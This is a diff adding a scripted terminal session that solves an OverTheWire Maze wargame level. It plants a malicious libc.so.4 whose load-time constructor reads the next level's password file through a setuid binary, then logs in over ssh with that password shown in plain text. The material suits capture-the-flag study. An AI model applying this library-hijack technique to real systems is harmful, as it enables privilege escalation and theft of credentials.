@@ -1,0 +1,46 @@
+id
+@sleep 3
+file /maze/maze1
+@sleep 3
+readelf -d /maze/maze1 | grep NEEDED
+@sleep 3
+objdump -d /maze/maze1 | sed -n '/<main>:/,/ret/p' | head -n 12
+@sleep 4
+md5sum /maze/maze1
+@sleep 3
+cd /tmp; rm -rf l1exp; mkdir l1exp; chmod 755 l1exp; cd l1exp
+@sleep 3
+@vi lib4.c
+#include <stdio.h>
+#include <unistd.h>
+/* libc.so.4 - the planted library: a constructor runs at load time
+   (before main) with the setuid binary's fsuid (maze2), so it can
+   read /etc/maze_pass/maze2 and print it. */
+__attribute__((constructor))
+static void init(void) {
+    char b[256];
+    FILE *f = fopen("/etc/maze_pass/maze2", "r");
+    if (!f) return;
+    size_t n = fread(b, 1, sizeof b - 1, f);
+    fclose(f);
+    b[n] = 0;
+    write(1, b, n);
+}
+int _dummy;
+@viend
+@sleep 2
+TMPDIR=/tmp/l1exp gcc -m32 -shared -fPIC -o libc.so.4 lib4.c && echo BUILT
+@sleep 4
+ls -l libc.so.4
+@sleep 3
+/maze/maze1
+@sleep 5
+exit
+@sleep 3
+@nowait ssh -o StrictHostKeyChecking=accept-new -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 2225 maze2@maze.labs.overthewire.org
+@waitfor password: jJF6jn9qW6
+@waitfor maze2@maze:~$ id
+@waitfor uid=15002 -
+cat /etc/maze_pass/maze2
+@waitfor jJF6jn9qW6 -
+@sleep 2
